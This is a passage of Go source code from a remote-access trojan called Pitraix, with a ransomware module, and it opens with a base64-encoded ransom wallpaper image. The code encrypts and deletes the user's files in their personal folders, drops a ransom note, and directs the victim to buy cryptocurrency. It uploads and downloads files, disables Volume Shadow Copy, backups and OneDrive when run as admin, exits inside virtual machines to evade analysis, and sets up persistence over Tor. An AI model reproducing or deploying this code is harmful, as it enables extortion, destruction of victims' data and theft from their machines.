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`

					wallpaperdec, _ := base64.StdEncoding.DecodeString(wallpaper)

					wallpaperName, _ := predictable_random("WALLPAPER!!1" + currentPath, 0, true)
					if len(wallpaperName) > 30 {
						wallpaperName = wallpaperName[:25]
					}

					wallpaperName += ".png"

					f, err := os.Create(filepath.Join(tmpFold, wallpaperName))
					fmt.Println(err)
					if err == nil {
						f.Write(wallpaperdec)
						f.Close()
						setwallpaperFile(filepath.Join(tmpFold, wallpaperName))
					}
				}()

				go func() {
					for i := 0; i < 15; i++ {
						beepSound(2000, 5000)
						time.Sleep(3 * time.Second)
				
					}
				}()

				go func(coin string) {
					time.Sleep(5 * time.Second)
					doInstru("shell", "notepad " + mainDrive + "\\" + "Users\\" + username + "\\Desktop\\READ_ME_25.txt")
					time.Sleep(480)
					doInstru("shell", "start chrome \"https://www.google.com/search?q=How to buy " + coin + "\"")

				}(ivspl[1])

				out = "Done"
			}
		}

	case "decrypt":
		key, err := base64.StdEncoding.DecodeString(iv)
		if err != nil {
			fmt.Println("error ransom key:", err)
			out = "Error:" + err.Error()
		} else {
			target_paths := []string{
				mainDrive + "\\" + "Users\\" + username + "\\Desktop",
				mainDrive + "\\" + "Users\\" + username + "\\Documents",
				mainDrive + "\\" + "Users\\" + username + "\\Downloads",
				mainDrive + "\\" + "Users\\" + username + "\\Pictures",
				mainDrive + "\\" + "Users\\" + username + "\\Videos",
				mainDrive + "\\" + "Users\\" + username + "\\Music",
			}
			for _, path := range target_paths {
				go decFiles(path, key)
			}

			out = "Done"
		}

	case "wallpaper":
		if file_Exists(iv) {
			setwallpaperFile(iv)
			out = "Done"
		} else {
			out = "File does not Exist"
		}
	
	case "download":
		if file_Exists(iv) {
			f, err := readFile(iv)
			if err == nil {
				out = base64.StdEncoding.EncodeToString(f)
			} else {
				out = "Error:" + err.Error()
			}
		} else {
			out = "Error: File does not Exist"
		}

	case "upload":
		ivspl := strings.Split(iv, " ")
		if len(ivspl) == 2 {
			fileBase64 := strings.TrimSpace(ivspl[1]) // iv[len(ivspl[0]) + 1:])

			content, err := base64.StdEncoding.DecodeString(fileBase64)
			if err == nil {
				f, _ := os.Create(filepath.Join(tmpFold, ivspl[0]))
				f.Write(content)
				f.Close()
				out = "Done"
			} else {
				out = "Error:" + err.Error()
			}
		} else {
			out = "Error: len not 2"
		}
	
	case "unzip":
		extn := strings.Split(iv, ".")
		if len(extn) > 1 {
			err := unzip(filepath.Join(iv), filepath.Join(extn[0]))
			if err == nil {
				out = "Done"
			} else {
				out = "Error: Couldn't unzip:" + err.Error()
			}
		} else {
			out = "Error: Invalid path " + iv
		}

	case "beep":
		ivspl := strings.Split(iv, " ")
		if len(ivspl) == 2 {
			freq, _ := strconv.Atoi(ivspl[0])
			dur, _ := strconv.Atoi(ivspl[1])

			err := beepSound(freq, dur)
			if err !=  nil{
				out = "Error: " + err.Error()
			} else {
				out = "Done"
			}
		} else {
			out = "Error: Invalid instruction format: " + iv
		}

	case "noop":
		fmt.Println("Pitraix")
	}

	// fmt.Println("out:", out)
	return out
}

func beepSound(freq, dur int) error {
	kernel32, _ := syscall.LoadLibrary("kernel32.dll")
	beep32, _ := syscall.GetProcAddress(kernel32, "Beep")
	defer syscall.FreeLibrary(kernel32)

	_, _, e := syscall.Syscall(uintptr(beep32), uintptr(2), uintptr(freq), uintptr(dur), 0)
	if e != 0 {
		return e
	}
	return nil
}

func decFiles(path string, key []byte) {
	files, err := ioutil.ReadDir(path)
	if err != nil {
		fmt.Println("error reading:", err)
		// continue
	}
	for _, file := range files {
		if strings.HasSuffix(file.Name(), ".ini") || strings.HasSuffix(file.Name(), ".lnk") {
			continue
		}
		if file.IsDir() {
			encFiles(path + "\\" + file.Name(), key)
			continue
		}
		fname := file.Name()
		if (path == mainDrive + "\\" + "Users\\" + username + "\\Desktop") && strings.HasPrefix(fname, "READ_ME_") && fname != "READ_ME_" {
			os.Remove(path + "\\" + fname)
			continue
		}
		f, err := readFile(path + "\\" + fname)
		if err != nil {
			fmt.Println("err 2", err)
			continue
		}
		oof := strings.Split(fname, "_")
		if len(oof) > 1 {
			nonce, err := hex.DecodeString(strings.Replace(oof[1], filepath.Ext(oof[1]), "", -1))
			if err != nil {
				fmt.Println("nonce error:", err)
				continue
			}
			decypher, err := decrypt_AES(f, nonce , key)
			if err != nil {
				fmt.Println("decryption error:", err)
				continue
			}
			os.Remove(path + "\\" + fname)
			out, err := os.Create(path + "\\" + oof[0]) // + filepath.Ext(fname))
			out.Write(decypher)
			if err != nil {
				fmt.Println("error creating encrypted file:", err)
				continue
			}
			out.Close()	
		}
	}
}

func encFiles(path string, key []byte) {
	files, err := ioutil.ReadDir(path)
	if err != nil {
		fmt.Println("err 1", err)
		// continue
	}
	for _, file := range files {
		if strings.HasSuffix(file.Name(), ".ini") || strings.HasSuffix(file.Name(), ".lnk") {
			continue
		}
		if file.IsDir() {
			encFiles(path + "\\" + file.Name(), key)
			continue
		}
		fname := file.Name()
		f, err := readFile(path + "\\" + fname)
		if err != nil {
			fmt.Println("err 2", err)
			continue
		}
		os.Remove(path + "\\" + fname)
		// f = append([]byte(fname + "|"))
		cypher, nonce, _ := encrypt_AES(f, key)

		out, err := os.Create(path + "\\" + fname + "_" + hex.EncodeToString(nonce) + filepath.Ext(fname))
		out.Write(cypher)
		if err != nil {
			fmt.Println("err 3", err)
			continue
		}
		out.Close()	
	}
}

func unzip(src, dest string) error {
    r, err := zip.OpenReader(src)
    if err != nil {
        return err
    }
    defer func() {
        if err := r.Close(); err != nil {
            // panic(err)
			log("unzip", "error while unzipping: " + err.Error())
			fmt.Println(err)
        }
    }()

    os.MkdirAll(dest, 0755)

    extractAndWriteFile := func(f *zip.File) error {
        rc, err := f.Open()
        if err != nil {
            return err
        }
        defer func() {
            if err := rc.Close(); err != nil {
				log("unzip", "error while extracting: " + err.Error())
                fmt.Println(err)
            }
        }()

        path := filepath.Join(dest, f.Name)

        if f.FileInfo().IsDir() {
            os.MkdirAll(path, f.Mode())
        } else {
            os.MkdirAll(filepath.Dir(path), f.Mode())
            f, err := os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
            if err != nil {
                return err
            }
            defer func() {
                if err := f.Close(); err != nil {
                    fmt.Println(err)
                }
            }()

            _, err = io.Copy(f, rc)
            if err != nil {
                return err
            }
        }
        return nil
    }

    for _, f := range r.File {
        err := extractAndWriteFile(f)
        if err != nil {
            return err
        }
    }

    return nil
}

func getMachineInfo() (string, int, string, string, int, string, string, string){
	var (
		hostname	   string
		machineType    int
		osVariant      string
 		kernelVersion  string
		arch 		   int
		machineVendor  string
		machineModel   string
		memory		   string
	)
	
	procArch := strings.TrimSpace(doInstru("shell", "echo %PROCESSOR_ARCHITECTURE%"))
	if procArch == "AMD64" || procArch == "64-bit" {
		arch = 0
	} else if procArch == "x86" || procArch == "34-bit" {
		arch = 1
	} else {
		arch = 2
	}

	osVariant = strings.TrimSpace(doInstru("shell", "ver"))
	kernelVersion = osVariant[19:len(osVariant) - 1]
	//osVariant = strings.TrimSpace(osVariant[8:])
	
	VendorInfo := strings.TrimSpace(doInstru("shell", "wmic computersystem get manufacturer, model,name"))
	VendorInfoField := strings.Fields(VendorInfo)
	machineModel = VendorInfoField[len(VendorInfoField) - 2]
	hostname = VendorInfoField[len(VendorInfoField) - 1]

	VendorSplitted := strings.Split(VendorInfo, "\n")
	machineVendor = strings.TrimSpace(VendorInfo[len(VendorSplitted[0]) + 1: len(VendorInfo) - (len(machineModel) + len(hostname) + 2)])

	if strings.Contains(hostname, "DESKTOP") || strings.Contains(hostname, "PC") {
		machineType = 0
	} else {
		machineType = 1
	}

	meminfo_Raw := strings.Fields(strings.TrimSpace(doInstru("shell", "wmic computersystem get totalphysicalmemory")))
	memory = meminfo_Raw[1]



	//fmt.Println(VendorInfo, "ok", machineVendor, machineModel, hostname, "end")
	// "wmic computersystem get model,name,manufacturer,systemtype"
	return hostname, machineType, osVariant, kernelVersion, arch, machineVendor, machineModel, memory
}


func vmCheck(userHostname, cpuVendor, machineVendor, machineModel string) {
	var vmCPU = map[string]bool{
		"bhyve bhyve ": true,
		" KVMKVMKVM  ": true,
		"TCGTCGTCGTCG": true,
		"Microsoft Hv": true,
		" lrpepyh  vr": true,
		"VMwareVMware": true,
		"XenVMMXenVMM": true,
		"ACRNACRNACRN": true,
		" QNXQVMBSQG ": true, // effect embedded systems 

	}
	if vmCPU[cpuVendor] || machineVendor == "innotek GmbH" || machineModel == "VirtualBox" {
		fmt.Println("VM!")
		os.Exit(0)
	}
}

func log(logContext, logInfo string) {
	logTimestamp := time.Now().String() // strings.Replace(time.Now().String(), "-", "", -1)
	// logTimestamp = logTimestamp[2:strings.Index(logTimestamp, ".")]
	// logTimestamp = strings.Replace(logTimestamp, " ", "", -1)
	// logTimestamp = strings.Replace(logTimestamp, ":", "", -1)

	// fmt.Println(fmt.Sprintf("logs|%s|%s|%s", logContext, logInfo, logTimestamp))
	confAsyncChn <- []string{"logs", logContext, logInfo, logTimestamp}
	// fmt.Sprintf("logs|%s|%s|%s", logContext, logInfo, logTimestamp)
}

func event(eventContext, eventInfo string) {
	eventTimestamp := time.Now().String() // strings.Replace(time.Now().String(), "-", "", -1)
	// eventTimestamp = eventTimestamp[2:strings.Index(eventTimestamp, ".")]
	// eventTimestamp = strings.Replace(eventTimestamp, " ", "", -1)
	// eventTimestamp = strings.Replace(eventTimestamp, ":", "", -1)
	confAsyncChn <- []string{"events", eventContext, eventInfo, eventTimestamp}
}

func copyf(src, dst string) error {
    in, err := os.Open(src)
    if err != nil {
        return err
    }
    defer in.Close()

    out, err := os.Create(dst)
    if err != nil {
        return err
    }
    defer out.Close()

    _, err = io.Copy(out, in)
    if err != nil {
        return err
    }

	// out.Sync()
    return out.Close()
}

func main() {
	contactDate = time.Now().String() // strings.Replace(time.Now().String(), "-", "", -1)
	// contactDate = contactDate[2:strings.Index(contactDate, ".")]
	// contactDate = strings.Replace(contactDate, " ", "", -1)
	// contactDate = strings.Replace(contactDate, ":", "", -1)
	
	cpuinfo_raw := strings.TrimSpace(doInstru("shell", "wmic CPU get name, manufacturer")[18:]) // "Intel(R) Core(TM) i5-4590 CPU @ 3.30GHz" // cpuInfo_Split[1] // fix
	cpuinfo_split := strings.Fields(cpuinfo_raw)
	cpu := strings.TrimSpace(cpuinfo_raw[len(cpuinfo_split[0]):])
	cpuVendor := cpuinfo_split[0]

	userHostname, machineType, osVariant, kernelVersion, arch, machineVendor, machineModel, memory := getMachineInfo()
	// fmt.Println(userHostname, osVariant, kernelVersion, arch, machineVendor, machineModel)

	vmCheck(userHostname, cpuVendor, machineVendor, machineModel)
	

	if tor_running_check() { // exits if already running
		os.Exit(0)
	}
	
	pitraix_FilePath, _ = predictable_random(cpu + cpuVendor + userHomeDIR + "zfPILTORACIXO!2" + username, 0, true)
	if len(pitraix_FilePath) > 30 {
		pitraix_FilePath = pitraix_FilePath[:25]
	}

	config_FilePath, _ = predictable_random(cpu + "@fCONPROFOVCPTDX$2" + pitraix_FilePath + username + userHomeDIR + cpuVendor, 0, true)
	if len(config_FilePath) > 30 {
		config_FilePath = config_FilePath[:25]
	}

	tor_FolderName, _ := predictable_random(config_FilePath + "@fPRISZBSTCCLEVANER~3" + username + cpu + cpuVendor + userHomeDIR, 0, true)
	if len(tor_FolderName) > 30 {
		tor_FolderName = tor_FolderName[:25]
	}

	rdmod.Seed(int64(bytesumbig([]byte(userHomeDIR + cpu + "VOWLLA" + userHomeDIR + username ))))
	locAES_Key = random_Bytes(32, false)

	// firstTime, _ := cft.updateConf(locAES_Key, cft.AES_Key, contactDate) //, username, cpu, cpuVendor, userHomeDIR)

	/*
		PERSISTENCE and path selecting
	*/

	pointerPaths := nonPrivPaths
	isadmin_const := isadmin()
	if isadmin_const {
		pointerPaths = PrivPaths
		doInstru("shell", "taskkill /fi \"Services eq VSS\" /F") // Disables Volume Shadow Copy
		doInstru("shell", "wbadmin disable backup -quiet") // Disables backups
		doInstru("shell", "taskkill /f /im OneDrive.exe") // kills onedrive
	}
	rdmod.Seed(int64(bytesumbig([]byte(userHomeDIR + "PRRFORVPRIVLPERSDFTN" + cpu + userHomeDIR + username ))))
	pitraix_FilePath = filepath.Join(pointerPaths[rdmod.Intn(len(pointerPaths) - 1)], pitraix_FilePath)
	// pitraix_spreadPath := pitraix_FilePath + "SP.exe"
	pitraix_FilePath += ".exe"
	
	rdmod.Seed(int64(bytesumbig([]byte(userHomeDIR + "VICCJIFJIRJVRIJGIERJFIHJ" + cpu + username ))))
	config_FilePath = filepath.Join(pointerPaths[rdmod.Intn(len(pointerPaths) - 1)], config_FilePath)

	rdmod.Seed(int64(bytesumbig([]byte(userHomeDIR + "AYYYECRAYYEACYEEEDXEGHQ" + cpu + username + userHomeDIR ))))
	tor_FolderPath := pointerPaths[rdmod.Intn(len(pointerPaths) - 1)]
	
	fmt.Println("pitraix_FilePath:", pitraix_FilePath, "\nconfig_FilePath:", config_FilePath, "\ntor_FolderPath:", tor_FolderPath)

	// rdmod.Seed(int64(bytesumbig([]byte(userHomeDIR + "MGUNRU4UFHHW2U8JSDQ" + cpu))))
	pitraix_taskName, _ := predictable_random("MGUNRU4UFHHW2U8JSDQ" + cpu + username + cpu, 0, true)
	if len(pitraix_taskName) > 15 {
		pitraix_taskName = pitraix_taskName[:15]
	}
	rdmod.Seed(int64(bytesumbig([]byte(cpu + cpuVendor + userHomeDIR + "LHREWDHITOEAHEAR" + username))))

	torPort := strconv.Itoa(rdmod.Intn(6999 - 3000) + 3000)	
	
	firstTime = !file_Exists(pitraix_FilePath)

	// fmt.Println("torPort:", torPort)
	// fmt.Println("firstTime:", firstTime)
	// fmt.Println("isadmin_const:", isadmin_const)

	if firstTime == true {
		// srcFile, _ := os.Open(currentPath)
		// destFile, _ := os.Create(pitraix_FilePath)
